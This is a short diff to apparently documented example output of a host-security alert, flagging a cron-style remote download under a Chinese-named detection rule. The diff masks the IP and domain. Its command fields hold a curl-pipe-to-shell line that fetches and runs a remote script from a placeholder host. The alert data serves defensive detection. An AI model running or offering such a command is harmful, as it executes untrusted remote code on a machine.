@@ -19,10 +19,10 @@ Output:
                 "Uuid": "05f0bcab-726c-4ea4-8109-bcd03d5598f7",
                 "Id": 10001,
                 "Quuid": "05f0bcab-726c-4ea4-8109-bcd03d5598f7",
-                "Hostip": "1.1.1.1",
+                "Hostip": "10.*.*.1",
                 "User": "root:root",
                 "Platform": 4,
-                "BashCmd": "/bin/sh -c curl www.xx.com |sh",
+                "BashCmd": "/bin/sh -c curl www.*.com |sh",
                 "RuleId": 150,
                 "RuleName": "系统规则(标准)-计划任务远程下载",
                 "RuleLevel": 2,
@@ -33,7 +33,7 @@ Output:
                 "Pid": "27605",
                 "Exe": "/usr/bin/bash",
                 "ModifyTime": "2024-10-17 20:09:01",
-                "RegexBashCmd": "/bin/sh -c curl www.xx.com |sh",
+                "RegexBashCmd": "/bin/sh -c curl www.*.com |sh",
                 "RuleCategory": 0,
                 "HostName": "机器名称"
             }
